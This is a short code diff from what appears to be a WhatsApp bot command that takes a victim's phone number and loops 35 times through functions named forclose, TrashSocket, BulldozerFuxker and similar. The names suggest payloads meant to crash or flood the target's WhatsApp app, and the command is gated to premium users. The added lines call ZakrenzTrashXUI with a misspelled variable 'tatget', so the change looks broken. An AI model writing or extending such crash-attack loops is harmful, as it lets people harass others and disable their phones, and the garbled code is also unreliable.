@@ -1655,12 +1655,14 @@ if (!isPremium) return m.reply('Khusus Premium');
 if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
           for (let i = 0; i < 35; i++) {
+            await ZakrenzTrashXUI(tatget);
             await forclose(target);
             await UiNew(target);
             await HadesNewUi(target);
             await TrashSocket(target);
             await BulldozerFuxker(target);
             await sleep(2000);
+            await ZakrenzTrashXUI(tatget);
             await forclose(target);
             await UiNew(target);
             await HadesNewUi(target);
